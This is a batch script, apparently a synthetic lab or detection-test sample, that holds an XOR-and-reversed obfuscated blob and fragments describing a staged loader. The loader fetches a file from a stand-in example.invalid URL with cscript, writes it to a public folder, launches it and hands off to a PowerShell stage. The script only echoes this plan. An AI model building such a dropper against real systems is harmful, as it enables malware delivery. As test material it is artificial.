@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|xor_5a
rem HUNTRESS-MATERIAL:=sWKqQ3b5M2b/gmarN2a39TP74SKn9TP74SKF4iI/QjJusjP09WOj92Pop2ajt2d/0zOukiB4sjFpkyPo4CNvIhB5MjN48iCGkCK/kyDGAWGnJjL7oSB/YzM8YiL74Dd4kGO4sGP88Wd+MjN7wCNzQ3P2oyN7IyP09WOj92Pop2ajtWd1BWKq4iLycmNo8iJvlzYv9Daqt2YrdHN9MzOqczO5cmPzUAN9MzOqczO5YiN28jMpgyPtUjKn9TP78SP0sjNF4iI/QjJoszP0MjNnJjK7gSPm42ZuQzL1kTB/0zOukiJ/IyP05iKzgSOpkzZo8jLqsjP7YiLqMDK5kSB8wTN+QzOyYXKp8TO1giKFITOusjKpMjP29jNzwTB/4yMo0id/4SN38DKF8DKz8yK5szZpoyPukiJrdGL
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "FrAg0=v=1|steps=acquire_remote,write_file,dispatch_process,handoff_script|adapter=csc"
set "FrAg1=ript.exe|stage_count=4|graph=linear|next_language=powershell|campaign_id=campai"
set "FrAg2=gn-19102e59c5|url=https://19102e59c5.example.invalid/5ff1bb3b.dat|file_path=C:\"
set "FrAg3=Users\Public\HuntressLab\stage-19102e59c5.dat|next_stage=stage-19102e59c5.ps1"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_arithmetic=52ec64d8"
ver >nul
if errorlevel 1 exit /b 1
set "ReCoVeReD="
for %%G in (0 1 2 3) do call set "ReCoVeReD=%%ReCoVeReD%%%%FrAg%%G%%"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo cscript.exe acquire, write, dispatch, and hand off stage-19102e59c5.ps1
exit /b 0
